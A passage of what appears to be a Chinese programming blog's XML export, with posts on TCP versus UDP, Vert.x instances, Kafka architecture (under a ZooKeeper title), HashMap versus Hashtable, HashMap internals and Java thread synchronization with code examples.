<p>   UDP不提供复杂的控制机制，利用IP提供面向无连接的通信服务。并且它是将应用程序发来的数据在收到的那一刻，立刻按照原样发送到网络上的一种机制。即使是出现网络拥堵的情况下，UDP也无法进行流量控制等避免网络拥塞的行为。此外，传输途中如果出现了丢包，UDO也不负责重发。甚至当出现包的到达顺序乱掉时也没有纠正的功能。如果需要这些细节控制，那么不得不交给由采用UDO的应用程序去处理。换句话说，UDP将部分控制转移到应用程序去处理，自己却只提供作为传输层协议的最基本功能。UDP有点类似于用户说什么听什么的机制，但是需要用户充分考虑好上层协议类型并制作相应的应用程序。</p>
<p>TCP补充：</p>
<p>  TCP充分实现了数据传输时各种控制功能，可以进行丢包的重发控制，还可以对次序乱掉的分包进行顺序控制。而这些在UDP中都没有。此外，TCP作为一种面向有连接的协议，只有在确认通信对端存在时才会发送数据，从而可以控制通信流量的浪费。TCP通过检验和. 序列号. 确认应答. 重发控制. 连接管理以及窗口控制等机制实现可靠性传输。</p>
<p>TCP与UDP区别总结：</p>
<ol>
<li><p>TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接</p>
</li>
<li><p>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保   证可靠交付</p>
</li>
<li><p>TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的</p>
</li>
</ol>
<p>  UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）</p>
<ol start="4">
<li><p>每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信</p>
</li>
<li><p>TCP首部开销20字节;UDP的首部开销小，只有8个字节</p>
</li>
<li><p>TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道</p>
</li>
</ol>
<p>！</p>
]]></content>
      <categories>
        <category>网络编程</category>
      </categories>
      <tags>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>vertx 多个cpu应用提高并发</title>
    <url>/2017/07/07/vertx-%E5%A4%9A%E4%B8%AAcpu%E5%BA%94%E7%94%A8%E6%8F%90%E9%AB%98%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<p>DeploymentOptions options = new DeploymentOptions().setInstances(16); vertx.deployVerticle(“com.mycompany.MyOrderProcessorVerticle”, options);</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>vertx</category>
      </categories>
      <tags>
        <tag>vertx</tag>
      </tags>
  </entry>
  <entry>
    <title>ZooKeeper原理</title>
    <url>/2017/07/02/zookeeper%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p><strong>简介</strong></p>
<p><a href="http://kafka.apache.org/">Apache Kafka</a>是分布式发布-订阅消息系统。它最初由LinkedIn公司开发，之后成为Apache项目的一部分。Kafka是一种快速、可扩展的、设计内在就是分布式的，分区的和可复制的提交日志服务。</p>
<p><strong>Kafka**</strong>架构**</p>
<p>它的架构包括以下组件：</p>
<p><strong>话题（Topic）：</strong>是特定类型的消息流。消息是字节的有效负载（Payload），话题是消息的分类名或种子（Feed）名。</p>
<p><strong>生产者（Producer）：</strong>是能够发布消息到话题的任何对象。</p>
<p><strong>服务代理（Broker）：</strong>已发布的消息保存在一组服务器中，它们被称为代理（Broker）或Kafka集群。</p>
<p><strong>消费者（Consumer）：</strong>可以订阅一个或多个话题，并从Broker拉数据，从而消费这些已发布的消息。</p>
<p><img src="http://images2015.cnblogs.com/blog/434101/201605/434101-20160514145613421-1488903046.png"></p>
<p><strong>Kafka**</strong>存储策略**</p>
<p>1）kafka以topic来进行消息管理，每个topic包含多个partition，每个partition对应一个逻辑log，有多个segment组成。</p>
<p>2）每个segment中存储多条消息（见下图），消息id由其逻辑位置决定，即从消息id可直接定位到消息的存储位置，避免id到位置的额外映射。</p>
<p>3）每个part在内存中对应一个index，记录每个segment中的第一条消息偏移。</p>
<p>4）发布者发到某个topic的消息会被均匀的分布到多个partition上（或根据用户指定的路由规则进行分布），broker收到发布消息往对应partition的最后一个segment上添加该消息，当某个segment上的消息条数达到配置值或消息发布时间超过阈值时，segment上的消息会被flush到磁盘，只有flush到磁盘上的消息订阅者才能订阅到，segment达到一定的大小后将不会再往该segment写数据，broker会创建新的segment。</p>
<p><img src="http://images2015.cnblogs.com/blog/434101/201605/434101-20160514145722812-631325437.png"></p>
<p><strong>Kafka删除策略</strong></p>
<p>1）N天前的删除。</p>
<p>2）保留最近的MGB数据。</p>
<p><strong>Kafka broker</strong></p>
<p>与其它消息系统不同，Kafka broker是无状态的。这意味着消费者必须维护已消费的状态信息。这些信息由消费者自己维护，broker完全不管（有offset managerbroker管理）。</p>
<ul>
<li>从代理删除消息变得很棘手，因为代理并不知道消费者是否已经使用了该消息。Kafka创新性地解决了这个问题，它将一个简单的基于时间的SLA应用于保留策略。当消息在代理中超过一定时间后，将会被自动删除。</li>
<li>这种创新设计有很大的好处，消费者可以故意倒回到老的偏移量再次消费数据。这违反了队列的常见约定，但被证明是许多消费者的基本特征。</li>
</ul>
<p>以下摘抄自kafka官方文档： <strong>Kafka Design</strong> 目标 1) 高吞吐量来支持高容量的事件流处理 2) 支持从离线系统加载数据 3) 低延迟的消息系统 持久化 1) 依赖文件系统，持久化到本地 2) 数据持久化到log 效率 1) 解决”small IO problem“： 使用”message set“组合消息。 server使用”chunks of messages“写到log。 consumer一次获取大的消息块。 2）解决”byte copying“： 在producer、broker和consumer之间使用统一的binary message format。 使用系统的pagecache。 使用sendfile传输log，避免拷贝。 端到端的批量压缩（<a href="https://kafka.apache.org/documentation.html#design_compression">End-to-end Batch Compression</a>） Kafka支持GZIP和Snappy压缩协议。 <strong>The Producer</strong> 负载均衡 1）producer可以自定义发送到哪个partition的路由规则。默认路由规则：hash(key)%numPartitions，如果key为null则随机选择一个partition。 2）自定义路由：如果key是一个user id，可以把同一个user的消息发送到同一个partition，这时consumer就可以从同一个partition读取同一个user的消息。 异步批量发送 批量发送：配置不多于固定消息数目一起发送并且等待时间小于一个固定延迟的数据。 <strong>The Consumer</strong> consumer控制消息的读取。 Push vs Pull 1)producer push data to broker，consumer pull data from broker 2)consumer pull的优点：consumer自己控制消息的读取速度和数量。 3)consumer pull的缺点：如果broker没有数据，则可能要pull多次忙等待，Kafka可以配置consumer long pull一直等到有数据。 Consumer Position 1)大部分消息系统由broker记录哪些消息被消费了，但Kafka不是。 2)Kafka由consumer控制消息的消费，consumer甚至可以回到一个old offset的位置再次消费消息。 Message Delivery Semantics 三种： At most once—Messages may be lost but are never redelivered. At least once—Messages are never lost but may be redelivered. Exactly once—this is what people actually want, each message is delivered once and only once. Producer：有个”acks“配置可以控制接收的leader的在什么情况下就回应producer消息写入成功。 Consumer： * 读取消息，写log，处理消息。如果处理消息失败，log已经写入，则无法再次处理失败的消息，对应”At most once“。 * 读取消息，处理消息，写log。如果消息处理成功，写log失败，则消息会被处理两次，对应”At least once“。 * 读取消息，同时处理消息并把result和log同时写入。这样保证result和log同时更新或同时失败，对应”Exactly once“。 Kafka默认保证at-least-once delivery，容许用户实现at-most-once语义，exactly-once的实现取决于目的存储系统，kafka提供了读取offset，实现也没有问题。 <strong>复制（Replication）</strong> 1）一个partition的复制个数（replication factor）包括这个partition的leader本身。 2）所有对partition的读和写都通过leader。 3）Followers通过pull获取leader上log（message和offset） 4）如果一个follower挂掉、卡住或者同步太慢，leader会把这个follower从”in sync replicas“（ISR）列表中删除。 5）当所有的”in sync replicas“的follower把一个消息写入到自己的log中时，这个消息才被认为是”committed“的。 6）如果针对某个partition的所有复制节点都挂了，Kafka选择最先复活的那个节点作为leader（这个节点不一定在ISR里）。 <strong>日志压缩（Log Compaction）</strong> 1）针对一个topic的partition，压缩使得Kafka至少知道每个key对应的最后一个值。 2）压缩不会重排序消息。 3）消息的offset是不会变的。 4）消息的offset是顺序的。 <strong>Distribution</strong> Consumer Offset Tracking 1）High-level consumer记录每个partition所消费的maximum offset，并定期commit到offset manager（broker）。 2）Simple consumer需要手动管理offset。现在的Simple consumer Java API只支持commit offset到zookeeper。 Consumers and Consumer Groups 1）consumer注册到zookeeper 2）属于同一个group的consumer（group id一样）平均分配partition，每个partition只会被一个consumer消费。 3）当broker或同一个group的其他consumer的状态发生变化的时候，consumer rebalance就会发生。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap与HashTable的区别</title>
    <url>/2017/06/18/hashmap%E4%B8%8Ehashtable%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p><strong>HashMap和Hashtable的区别</strong></p>
<blockquote>
<p>概览：</p>
<p>hashmap</p>
<p>线程不安全</p>
<p>允许有null的键和值</p>
<p>效率高一点、</p>
<p>方法不是Synchronize的要提供外同步</p>
<p>有containsvalue和containsKey方法</p>
<p>HashMap 是Java1.2 引进的Map interface 的一个实现</p>
<p>HashMap是Hashtable的轻量级实现</p>
<p>hashtable</p>
<p>线程安全</p>
<p>不允许有null的键和值</p>
<p>效率稍低、</p>
<p>方法是是Synchronize的</p>
<p>有contains方法方法</p>
<p>Hashtable 继承于Dictionary 类</p>
<p>Hashtable 比HashMap 要旧</p>
</blockquote>
<p> </p>
<p>HashMap和Hashtable都实现了Map接口，但决定用哪一个之前先要弄清楚它们之间的分别。主要的区别有：线程安全性，同步(synchronization)，以及速度。</p>
<ol>
<li>HashMap几乎可以等价于Hashtable，除了HashMap是非synchronized的，并可以接受null(HashMap可以接受为null的键值(key)和值(value)，而Hashtable则不行)。</li>
<li>HashMap是非synchronized，而Hashtable是synchronized，这意味着Hashtable是线程安全的，多个线程可以共享一个Hashtable；而如果没有正确的同步的话，多个线程是不能共享HashMap的。Java 5提供了ConcurrentHashMap，它是HashTable的替代，比HashTable的扩展性更好。</li>
<li>另一个区别是HashMap的迭代器(Iterator)是fail-fast迭代器，而Hashtable的enumerator迭代器不是fail-fast的。所以当有其它线程改变了HashMap的结构（增加或者移除元素），将会抛出ConcurrentModificationException，但迭代器本身的remove()方法移除元素则不会抛出ConcurrentModificationException异常。但这并不是一个一定发生的行为，要看JVM。这条同样也是Enumeration和Iterator的区别。</li>
<li>由于Hashtable是线程安全的也是synchronized，所以在单线程环境下它比HashMap要慢。如果你不需要同步，只需要单一线程，那么使用HashMap性能要好过Hashtable。</li>
<li>HashMap不能保证随着时间的推移Map中的元素次序是不变的。</li>
</ol>
<h3 id="要注意的一些重要术语："><a href="#要注意的一些重要术语：" class="headerlink" title="要注意的一些重要术语："></a>要注意的一些重要术语：</h3><ol>
<li>sychronized意味着在一次仅有一个线程能够更改Hashtable。就是说任何线程要更新Hashtable时要首先获得同步锁，其它线程要等到同步锁被释放之后才能再次获得同步锁更新Hashtable。 2) Fail-safe和iterator迭代器相关。如果某个集合对象创建了Iterator或者ListIterator，然后其它的线程试图“结构上”更改集合对象，将会抛出ConcurrentModificationException异常。但其它线程可以通过set()方法更改集合对象是允许的，因为这并没有从“结构上”更改集合。但是假如已经从结构上进行了更改，再调用set()方法，将会抛出IllegalArgumentException异常。 3) 结构上的更改指的是删除或者插入一个元素，这样会影响到map的结构。</li>
</ol>
<h3 id="我们能否让HashMap同步？"><a href="#我们能否让HashMap同步？" class="headerlink" title="我们能否让HashMap同步？"></a>我们能否让HashMap同步？</h3><p>HashMap可以通过下面的语句进行同步： Map m = Collections.synchronizeMap(hashMap);</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>Hashtable和HashMap有几个主要的不同：线程安全以及速度。仅在你需要完全的线程安全的时候使用Hashtable，而如果你使用Java 5或以上的话，请使用ConcurrentHashMap吧。</p>
<p>1 HashMap不是线程安全的 HashMap是map接口的子类，是将键映射到值的对象，其中键和值都是对象，并且不能包含重复键，但可以包含重复值。HashMap允许null key和null value，而hashtable不允许。 2   HashTable是线程安全。 HashMap是Hashtable的轻量级实现（非线程安全的实现），他们都完成了Map接口，主要区别在于HashMap允许空（null）键值（key）,由于非线程安全，效率上可能高于Hashtable。 HashMap允许将null作为一个entry的key或者value，而Hashtable不允许。 HashMap把Hashtable的contains方法去掉了，改成containsvalue和containsKey。因为contains方法容易让人引起误解。 Hashtable继承自Dictionary类，而HashMap是Java1.2引进的Map interface的一个实现。 最大的不同是，Hashtable的方法是Synchronize的，而HashMap不是，在多个线程访问Hashtable时，不需要自己为它的方法实现同步，而HashMap 就必须为之提供外同步。 Hashtable和HashMap采用的hash/rehash算法都大概一样，所以性能不会有很大的差。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>HashMap的工作原理</title>
    <url>/2017/06/18/hashmap%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p><strong>“你用过HashMap吗？” “什么是HashMap？你为什么用到它？”</strong></p>
</blockquote>
<p>几乎每个人都会回答“是的”，然后回答HashMap的一些特性，譬如HashMap可以接受null键值和值，而Hashtable则不能；HashMap是非synchronized;HashMap很快；以及HashMap储存的是键值对等等。这显示出你已经用过HashMap，而且对它相当的熟悉。但是面试官来个急转直下，从此刻开始问出一些刁钻的问题，关于HashMap的更多基础的细节。面试官可能会问出下面的问题：</p>
<blockquote>
<p><strong>“你知道HashMap的工作原理吗？” “你知道HashMap的get()方法的工作原理吗？”</strong></p>
</blockquote>
<p>你也许会回答“我没有详查标准的Java API，你可以看看Java源代码或者Open JDK。”“我可以用Google找到答案。” 但一些面试者可能可以给出答案，“HashMap是基于hashing的原理，我们使用put(key, value)存储对象到HashMap中，使用get(key)从HashMap中获取对象。当我们给put()方法传递键和值时，我们先对键调用hashCode()方法，返回的hashCode用于找到bucket位置来储存Entry对象。”这里关键点在于指出，HashMap是在bucket中储存键对象和值对象，作为Map.Entry。这一点有助于理解获取对象的逻辑。如果你没有意识到这一点，或者错误的认为仅仅只在bucket中存储值的话，你将不会回答如何从HashMap中获取对象的逻辑。这个答案相当的正确，也显示出面试者确实知道hashing以及HashMap的工作原理。但是这仅仅是故事的开始，当面试官加入一些Java程序员每天要碰到的实际场景的时候，错误的答案频现。下个问题可能是关于HashMap中的碰撞探测(collision detection)以及碰撞的解决方法：</p>
<blockquote>
<p><strong>“当两个对象的hashcode相同会发生什么？”</strong></p>
</blockquote>
<p>从这里开始，真正的困惑开始了，一些面试者会回答因为hashcode相同，所以两个对象是相等的，HashMap将会抛出异常，或者不会存储它们。然后面试官可能会提醒他们有equals()和hashCode()两个方法，并告诉他们两个对象就算hashcode相同，但是它们可能并不相等。一些面试者可能就此放弃，而另外一些还能继续挺进，他们回答“因为hashcode相同，所以它们的bucket位置相同，‘碰撞’会发生。因为HashMap使用链表存储对象，这个Entry(包含有键值对的Map.Entry对象)会存储在链表中。”这个答案非常的合理，虽然有很多种处理碰撞的方法，这种方法是最简单的，也正是HashMap的处理方法。但故事还没有完结，面试官会继续问：</p>
<blockquote>
<p><strong>“如果两个键的hashcode相同，你如何获取值对象？”</strong></p>
</blockquote>
<p>面试者会回答：当我们调用get()方法，HashMap会使用键对象的hashcode找到bucket位置，然后获取值对象。面试官提醒他如果有两个值对象储存在同一个bucket，他给出答案:将会遍历链表直到找到值对象。面试官会问因为你并没有值对象去比较，你是如何确定确定找到值对象的？除非面试者直到HashMap在链表中存储的是键值对，否则他们不可能回答出这一题。 其中一些记得这个重要知识点的面试者会说，找到bucket位置之后，会调用keys.equals()方法去找到链表中正确的节点，最终找到要找的值对象。完美的答案！ 许多情况下，面试者会在这个环节中出错，因为他们混淆了hashCode()和equals()方法。因为在此之前hashCode()屡屡出现，而equals()方法仅仅在获取值对象的时候才出现。一些优秀的开发者会指出使用不可变的、声明作final的对象，并且采用合适的equals()和hashCode()方法的话，将会减少碰撞的发生，提高效率。不可变性使得能够缓存不同键的hashcode，这将提高整个获取对象的速度，使用String，Interger这样的wrapper类作为键是非常好的选择。 如果你认为到这里已经完结了，那么听到下面这个问题的时候，你会大吃一惊。</p>
<blockquote>
<p><strong>“如果HashMap的大小超过了负载因子(load factor)定义的容量，怎么办？”</strong></p>
</blockquote>
<p>除非你真正知道HashMap的工作原理，否则你将回答不出这道题。默认的负载因子大小为0.75，也就是说，当一个map填满了75%的bucket时候，和其它集合类(如ArrayList等)一样，将会创建原来HashMap大小的两倍的bucket数组，来重新调整map的大小，并将原来的对象放入新的bucket数组中。这个过程叫作rehashing，因为它调用hash方法找到新的bucket位置。 如果你能够回答这道问题，下面的问题来了：</p>
<blockquote>
<p><strong>“你了解重新调整HashMap大小存在什么问题吗？”</strong></p>
</blockquote>
<p>你可能回答不上来，这时面试官会提醒你当多线程的情况下，可能产生条件竞争(race condition)。 当重新调整HashMap大小的时候，确实存在条件竞争，因为如果两个线程都发现HashMap需要重新调整大小了，它们会同时试着调整大小。在调整大小的过程中，存储在链表中的元素的次序会反过来，因为移动到新的bucket位置的时候，HashMap并不会将元素放在链表的尾部，而是放在头部，这是为了避免尾部遍历(tail traversing)。如果条件竞争发生了，那么就死循环了。这个时候，你可以质问面试官，为什么这么奇怪，要在多线程的环境下使用HashMap呢？：） 热心的读者贡献了更多的关于HashMap的问题：</p>
<ol>
<li><strong>为什么String, Interger这样的wrapper类适合作为键？</strong> </li>
</ol>
<p>String, Interger这样的wrapper类作为HashMap的键是再适合不过了，而且String最为常用。因为String是不可变的，也是final的，而且已经重写了equals()和hashCode()方法了。其他的wrapper类也有这个特点。不可变性是必要的，因为为了要计算hashCode()，就要防止键值改变，如果键值在放入时和获取时返回不同的hashcode的话，那么就不能从HashMap中找到你想要的对象。不可变性还有其他的优点如线程安全。如果你可以仅仅通过将某个field声明成final就能保证hashCode是不变的，那么请这么做吧。因为获取对象的时候要用到equals()和hashCode()方法，那么键对象正确的重写这两个方法是非常重要的。如果两个不相等的对象返回不同的hashcode的话，那么碰撞的几率就会小些，这样就能提高HashMap的性能。<br>2.  <strong>我们可以使用自定义的对象作为键吗？</strong> 这是前一个问题的延伸。当然你可能使用任何对象作为键，只要它遵守了equals()和hashCode()方法的定义规则，并且当对象插入到Map中之后将不会再改变了。如果这个自定义对象时不可变的，那么它已经满足了作为键的条件，因为当它创建之后就已经不能改变了。<br>3.  <strong>我们可以使用CocurrentHashMap来代替Hashtable吗？</strong></p>
<p>这是另外一个很热门的面试题，因为ConcurrentHashMap越来越多人用了。我们知道Hashtable是synchronized的，但是ConcurrentHashMap同步性能更好，因为它仅仅根据同步级别对map的一部分进行上锁。ConcurrentHashMap当然可以代替HashTable，但是HashTable提供更强的线程安全性。</p>
<p>我个人很喜欢这个问题，因为这个问题的深度和广度，也不直接的涉及到不同的概念。让我们再来看看这些问题设计哪些知识点：</p>
<ul>
<li>hashing的概念</li>
<li>HashMap中解决碰撞的方法</li>
<li>equals()和hashCode()的应用，以及它们在HashMap中的重要性</li>
<li>不可变对象的好处</li>
<li>HashMap多线程的条件竞争</li>
<li>重新调整HashMap的大小</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><a href="https://github.com/stephanietang/ImportNew/blob/master/Java/How%20HashMap%20works%20in%20Java.md#%E6%80%BB%E7%BB%93"></a>总结</h3><h4 id="HashMap的工作原理"><a href="#HashMap的工作原理" class="headerlink" title="HashMap的工作原理"></a><a href="https://github.com/stephanietang/ImportNew/blob/master/Java/How%20HashMap%20works%20in%20Java.md#hashmap%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-1"></a>HashMap的工作原理</h4><p>HashMap基于hashing原理，我们通过put()和get()方法储存和获取对象。当我们将键值对传递给put()方法时，它调用键对象的hashCode()方法来计算hashcode，让后找到bucket位置来储存值对象。当获取对象时，通过键对象的equals()方法找到正确的键值对，然后返回值对象。HashMap使用链表来解决碰撞问题，当发生碰撞了，对象将会储存在链表的下一个节点中。 HashMap在每个链表节点中储存键值对对象。 当两个不同的键对象的hashcode相同时会发生什么？ 它们会储存在同一个bucket位置的链表中。键对象的equals()方法用来找到键值对</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java线程同步策略</title>
    <url>/2017/06/17/java%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>引用《Java Concurrency In Practice》对线程安全的定义</p>
<blockquote>
<p>当多个线程访问一个对象时，如果不用考虑这些线程在运行时环境下的调度和交替执行，也不需要进行额外的同步，或者在调用方进行任何其他的协调操作，调用这个对象的行为都可以获得正确的结果，那这个对象是线程安全的。</p>
</blockquote>
<p>这意味着如若要实现线程安全，代码本身必须要封装所有必要的正确性保障手段（比如锁的实现），以确保程序无论在多线程环境下如何调用该方法，将始终保持返回正确的结果。</p>
<h2 id="Java的线程安全"><a href="#Java的线程安全" class="headerlink" title="Java的线程安全"></a>Java的线程安全</h2><p>我们在讨论Java的线程安全，实际上讨论的是“相对线程安全”。需要保证的是单独对象操作是线程安全的，调用过程中不需要额外的保障措施，但是涉及到某些业务场景需要特定顺序连续调用，就可能需要调用者考虑使用额外的同步手段保证同步。引用《深入理解Java虚拟机》一书中的例子很能说明问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static Vector&lt;Integer&gt; vector &#x3D; new Vector&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">public static void main(String\[\] args)&#123;</span><br><span class="line">    while(true)&#123;</span><br><span class="line">        for(int i &#x3D; 0; i&lt;10; i++)&#123;</span><br><span class="line">            vector.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;一个线程删数据</span><br><span class="line">    Thread removeThread &#x3D; new Thread(new Runnable()&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void run()&#123;</span><br><span class="line">            for(int i&#x3D;0 ; i&lt;vector.size() ;i++)&#123;</span><br><span class="line">                vector.remove(i);   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;一个线程读数据</span><br><span class="line">    Thread printThread &#x3D; new Thread(new Runnable() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void run()&#123;</span><br><span class="line">            for(int i&#x3D;0 ; i&lt;vector.size() ;i++)&#123;</span><br><span class="line">                System.out.println(vector.get(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    removeThread.start();</span><br><span class="line">    printThread.start();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;防止过多线程，内存溢出</span><br><span class="line">    while(Thread.activeCount() &gt; 20);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">运行报错：</span><br><span class="line"></span><br><span class="line">    java.lang.ArrayIndexOutOfBoundsException</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">虽然说Vector已经是Java中所谓的“线程安全”了，但是在这种特殊的情况下，无法保证正确的输出结果。这里就需要做一些额外的同步手段，如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Thread removeThread = new Thread(new Runnable(){<br>    @Override<br>    public void run(){<br>        synchronized (vector){<br>            for(int i=0 ; i&lt;vector.size() ;i++){<br>                vector.remove(i);<br>            }<br>        }<br>    }<br>});</p>
<p>//一个线程读数据<br>Thread printThread = new Thread(new Runnable() {<br>    @Override<br>    public void run(){<br>        synchronized (vector){<br>            for(int i=0 ; i&lt;vector.size() ;i++){<br>                System.out.println(vector.get(i));<br>            }<br>        }<br>    }<br>});</p>
<p>```
 </p>
<h1 id="Java中的互斥同步"><a href="#Java中的互斥同步" class="headerlink" title="Java中的互斥同步"></a>Java中的互斥同步</h1><h2 id="Synchronized"><a href="#Synchronized" class="headerlink" title="Synchronized"></a>Synchronized</h2><p>说到线程安全，离不开讨论锁的实现方式。说到锁，Java开发者们第一想到的肯定是Synchronized关键字，我们就先从这个关键字切入，来阐述Java中锁的实现。</p>
<h4 id="同步原理"><a href="#同步原理" class="headerlink" title="同步原理"></a><em>同步原理</em></h4><blockquote>
<p>JVM规范规定JVM基于进入和退出Monitor对象来实现方法同步和代码块同步，但两者的实现细节不一样。代码块同步是使用monitorenter和monitorexit指令实现，而方法同步是使用另外一种方式实现的，细节在JVM规范里并没有详细说明，但是方法的同步同样可以使用这两个指令来实现。monitorenter指令是在编译后插入到同步代码块的开始位置，而monitorexit是插入到方法结束处和异常处， JVM要保证每个monitorenter必须有对应的monitorexit与之配对。任何对象都有一个 monitor 与之关联，当且一个monitor 被持有后，它将处于锁定状态。线程执行到 monitorenter 指令时，将会尝试获取对象所对应的 monitor 的所有权，即尝试获得对象的锁。</p>
</blockquote>
<p>Sychronized采取的同步策略是互斥同步，怎么理解互斥同步呢？通常情况下，临界区（Critical Section）、互斥量（Mutex）和信号量（Semaphore）都是主要的互斥实现形式。在每次获取资源之前，都需要检查是否有线程占用该资源。 这里有两个关键点需要注意：</p>
<ul>
<li>Sychronized是可重入的；</li>
<li>已经进入的线程尚未执行完，将会阻塞后面其他线程；</li>
</ul>
<h4 id="锁的本质是对象实例"><a href="#锁的本质是对象实例" class="headerlink" title="锁的本质是对象实例"></a><em>锁的本质是对象实例</em></h4><p>对于非静态方法来说，Synchronized 有两种呈现形式，Synchronized方法体和Synchronized语句块。两种呈现形式本质上的锁都是对象实例。 来看看代码实现</p>
<p>package org.leon.concurent;</p>
<p>public class SynchronizeDemo {</p>
<pre><code>static SynchronizeDemo synchronizeDemo = new SynchronizeDemo();

public static void main(String\[\] args) &#123;
    Thread t1 = new Thread(synchronizeDemo::doSth1);
    Thread t2 = new Thread(synchronizeDemo::doSth1);
    t1.start();
    t2.start();
&#125;

public void doSth1() &#123;
    /\*\*
     \* 锁对象实例 synchronizeDemo
     */
    synchronized (synchronizeDemo)&#123;
        try &#123;
            System.out.println(&quot;正在执行方法&quot;);
            Thread.sleep(10000);
            System.out.println(&quot;正在退出方法&quot;);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

public void doSth2() &#123;
    /\*\*
     \* 锁对象实例 this 等同于 synchronizeDemo
     */
    synchronized (this)&#123;
        try &#123;
            System.out.println(&quot;正在执行方法&quot;);
            Thread.sleep(10000);
            System.out.println(&quot;正在退出方法&quot;);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

public synchronized void doSth3() &#123;
    /\*\*
     \*  表面呈现是锁方法体，实际上是synchronized (this) ，等价于上面
     */
    try &#123;
        System.out.println(&quot;正在执行方法&quot;);
        Thread.sleep(10000);
        System.out.println(&quot;正在退出方法&quot;);
    &#125; catch (InterruptedException e) &#123;
        e.printStackTrace();
    &#125;
&#125;</code></pre>
<p>}</p>
<p>那么对于静态方法来说锁定的又是什么呢？</p>
<p>package org.leon.concurent;</p>
<p>public class SynchronizeDemo {</p>
<pre><code>public static void main(String\[\] args) &#123;
    Thread t1 = new Thread(SynchronizeDemo::doSth1);
    Thread t2 = new Thread(SynchronizeDemo::doSth1);
    t1.start();
    t2.start();
&#125;
/\*\*
 \* 锁定Synchronized 的Class对象
 */
public static void doSth1() &#123;
    synchronized (SynchronizeDemo.class)&#123;
        try &#123;
            System.out.println(&quot;正在执行方法&quot;);
            Thread.sleep(10000);
            System.out.println(&quot;正在退出方法&quot;);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

/\*\*
 \* 锁定当前类的Class对象，所以和上边等价
 */
public synchronized static void doSth2() &#123;
    try &#123;
        System.out.println(&quot;正在执行方法&quot;);
        Thread.sleep(10000);
        System.out.println(&quot;正在退出方法&quot;);
    &#125; catch (InterruptedException e) &#123;
        e.printStackTrace();
    &#125;
&#125;</code></pre>
<p>}</p>
<p>我们可以看出，从本质上而非呈现形式上看，synchronized同步也分两种。</p>
<ul>
<li>锁类的对象实例，针对于某个具体实例普通方法/语句块的互斥；</li>
<li>锁类的Class对象，针对于Class类静态方法/语句块的互斥；</li>
</ul>
<h4 id="进程切换导致的系统开销"><a href="#进程切换导致的系统开销" class="headerlink" title="进程切换导致的系统开销"></a><em>进程切换导致的系统开销</em></h4><p>Java的线程是直接映射到操作系统线程之上的，线程的挂起、阻塞、唤醒等都需要操作系统的参与，因此在线程切换的过程中是有一定的系统开销的。在多线程环境下调用Synchronized方法，有可能需要多次线程状态切换，因此可以说Synchronized是在Java语言中一个重量级操作。 虽然如此，JDK1.6版本后还是对Synchronized关键字做了相关优化，加入锁自旋特性减少系统线程切换导致的开销，几乎与ReentrantLock的性能不相上下，因此建议在能满足业务需求的前提下，优先使用Sychronized。</p>
<h2 id="ReentrantLock-可重入锁"><a href="#ReentrantLock-可重入锁" class="headerlink" title="ReentrantLock (可重入锁)"></a>ReentrantLock (可重入锁)</h2><p>与Synchronized的实现原理类似，采用的都是互斥同步策略，用法和实现效果上来说也很相似，也具备可重入的特性。 不同点是，Sychronized是原生语法层面上同步控制，其颗粒度更大；相比而言，ReentranLock是从API层面来控制锁（lock()与unlock()方法），开发者的自主权更强，可控制粒度更细，优化空间更高。</p>
